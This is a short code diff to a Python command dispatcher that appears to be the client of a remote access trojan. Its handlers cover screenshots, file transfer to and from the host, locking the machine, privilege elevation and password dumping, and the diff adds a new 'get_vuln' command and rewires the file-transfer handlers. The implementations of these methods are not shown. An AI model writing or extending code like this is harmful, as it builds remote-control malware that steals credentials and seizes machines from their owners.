@@ -26,9 +26,9 @@ class CommandHandler:
         elif _command == CLIENT_SCREENSHOT:
             self.control.screenshot()
         elif _command == CLIENT_UPLOAD_FILE:
-            self.control.upload(command["value"]["buffer"], command["value"]["value"])
+            self.control.download(command["value"]["buffer"], command["value"]["value"])
         elif _command == CLIENT_RECV_FILE:
-            self.control.receive(command["value"])
+            self.control.send_file(command["value"])
         elif _command == CLIENT_LOCK:
             self.control.lock()
         elif _command == CLIENT_HEARTBEAT:
@@ -53,4 +53,6 @@ class CommandHandler:
             self.control.elevate()
         elif _command == CLIENT_PWD:
             self.control.password_dump(command["value"])
+        elif _command == CLIENT_GET_VULN:
+            self.control.get_vuln(command["value"])
 
